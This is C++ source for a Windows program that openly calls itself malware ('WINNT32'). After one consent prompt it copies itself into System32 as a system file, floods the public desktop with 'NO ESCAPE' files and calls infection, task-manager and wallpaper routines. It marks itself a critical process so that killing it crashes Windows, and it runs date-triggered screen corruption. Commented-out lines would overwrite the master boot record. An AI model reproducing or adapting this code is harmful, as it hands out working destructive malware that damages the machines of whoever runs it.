//todo : implement hooks and add base file for run 
//#define _CRT_SECURE_NO_WARNINGS
#pragma warning(suppress : 4996)
#include "definitions.h" //contains all the functions
void all();
void taskmgr();
void lua();
#include <shlwapi.h> // Required for check file existence
#include <shlobj.h>
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
	//unconditional file check
	//if malware body exists then skip this message if not start the infection process
	//anyone can actually abuse this so might fix this after sometime
	//100% best code organisation
	FILE* file;
	if (file = fopen("C:\\Windows\\System32\\winnt32.exe", "r")) {
		fclose(file);
		SYSTEMTIME time;
		GetSystemTime(&time);
		resource1();
		launch();
		taskmgr();
		lua();
		nochange();
		wallpaper();
		autocolorization();
		use();
		infect();
		//CreateThread(NULL, 0, &winnt32WatchdogThread, NULL, 0, NULL);
		if (time.wMonth == 1 && time.wDay == 1) {
			Sleep(20000);
			while (1) {
				HDC hdc = GetDC(HWND_DESKTOP);
				int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
				BitBlt(hdc, rand() % 5, rand() % 5, rand() % sw, rand() % sh, hdc, rand() % 5, rand() % 5, SRCCOPY);
				ReleaseDC(0, hdc);
			}
		}
		if (time.wMonth == 12 && time.wDay == 24) {
			MessageBoxA(NULL, "THERE IS NO ESCAPE NOW", "WINNT32", MB_ICONINFORMATION);
			if (file = fopen("C:\\Windows\\System32\\noescapeexe.txt", "r")) {
				fclose(file);
				ExitProcess(0);
			}
			else {
				//CreateDesktopFiles();
				RtlAdjustPrivilege(20, TRUE, FALSE, &bl);
				BreakOnTermination = 1;
				clean();
				HANDLE note = CreateFileA("C:\\Windows\\System32\\noescapeexe.txt", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);

				if (note == INVALID_HANDLE_VALUE)
					ExitProcess(4);
				DWORD wb;
				if (!WriteFile(note, msg, msg_len, &wb, NULL))
					ExitProcess(5);

				CloseHandle(note);
				//BreakOnTermination = 0;

				//status = NtSetInformationProcess((HANDLE)-1, 0x1d, &BreakOnTermination, sizeof(ULONG));
				status = NtSetInformationProcess((HANDLE)-1, 0x1d, &BreakOnTermination, sizeof(ULONG));
				//char mbrData[512];
				//ZeroMemory(&mbrData, (sizeof mbrData));
				//HANDLE MBR = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
				//DWORD write;
				//WriteFile(MBR, mbrData, 512, &write, NULL);
				//CloseHandle(MBR);
				ShellExecuteA(NULL, NULL, "notepad.exe", NULL, NULL, SW_SHOW);
				//HANDLE thread = CreateThread(NULL, 0, &WatchdogThread, NULL, 0, NULL);
				Sleep(2000);
				lol();
				HANDLE thread = CreateThread(NULL, 0, &notepadWatchdogThread, NULL, 0, NULL);
				Sleep(2000);
				//CreateThread(NULL, 0, Checkykey, NULL, 0, NULL);
				CreateThread(NULL, 0, Checknkey, NULL, 0, NULL);
				while (1) {
					if (GetAsyncKeyState('S') & 0x8000) {
						TerminateThread(thread, 0);
						CloseHandle(thread);
						execute();
						infect();
						DeleteFileA("C:\\Windows\\System32\\noescapeexe.txt");
						for (;;) {
							Sleep(10);
						}
					}
					else {
						if (GetAsyncKeyState('S') & 0x8000) {
							TerminateThread(thread, 0);
							CloseHandle(thread);
							execute();
							infect();
							DeleteFileA("C:\\Windows\\System32\\noescapeexe.txt");
							for (;;) {
								Sleep(10);
							}
						}
					}
				}
			}
		}
		if (time.wMonth == 3 && time.wDay == 13) {

			RtlAdjustPrivilege(20, TRUE, FALSE, &bl);
			BreakOnTermination = 1;

			status = NtSetInformationProcess((HANDLE)-1, 0x1d, &BreakOnTermination, sizeof(ULONG));
			Sleep(10000);
			move();
		}
		if (time.wMonth == 5 && time.wDay == 4) {
			RtlAdjustPrivilege(20, TRUE, FALSE, &bl);
			BreakOnTermination = 1;

			status = NtSetInformationProcess((HANDLE)-1, 0x1d, &BreakOnTermination, sizeof(ULONG));
			dark();
		}
		if (time.wMonth == 1 && time.wDay == 5) {
			MessageBoxA(NULL, "Fred Durst Says: No computer today silly boy go outsie to play", "New Message(1) From Fred Durst", MB_ICONEXCLAMATION);
		}
		RtlAdjustPrivilege(20, TRUE, FALSE, &bl);
		BreakOnTermination = 1;

		status = NtSetInformationProcess((HANDLE)-1, 0x1d, &BreakOnTermination, sizeof(ULONG));
		while (true) {

		}
	}
	else {
		if (MessageBoxA(NULL, "This malware is no joke, continue?", "WINNT32.EXE", MB_YESNO | MB_ICONQUESTION) == IDYES)
		{
			char system[MAX_PATH];
			char pathtofile[MAX_PATH];
			HMODULE GetModH = GetModuleHandleA(NULL);
			GetModuleFileNameA(GetModH, pathtofile, sizeof(pathtofile));
			GetSystemDirectoryA(system, sizeof(system));
			strcat(system, "\\winnt32.exe");
			CopyFileA(pathtofile, system, false);
			SetFileAttributes(L"C:\\Windows\\System32\\winnt32.exe", FILE_ATTRIBUTE_SYSTEM);
			extractall();
			std::size_t l = 0;                                                            // starts a counting number this will help this program to create separate files
			const char* path = "C:\\Users\\Public\\Desktop\\";                                                      // location in which all files are going to stored
			std::string content = "Your Computer is mine you can't get rid of this malware - NO ESCAPE";                 // the content of our files                                                                      // creates a folder in c: drive in which files are going to written in and saved
			for (int i = 0; i < 150; i++)// an infinite loop
			{
				l++;                                                                               // adds i to itself every time
				std::ofstream file;                                                                // creates a constructor this will save our file
				file.open(path + std::to_string(l) + ".txt", std::ios_base::out);                  // creates a file to a location
				file << content;                                                                   // writes the content in the file and then saves it
				file.close();                                                                      // closes the file // if you want to take more resources don't write this line                 // gives us an accurate number of files created inside a directory
			}
			all();
		}
		else
		{
			return 0;
		}
	}
}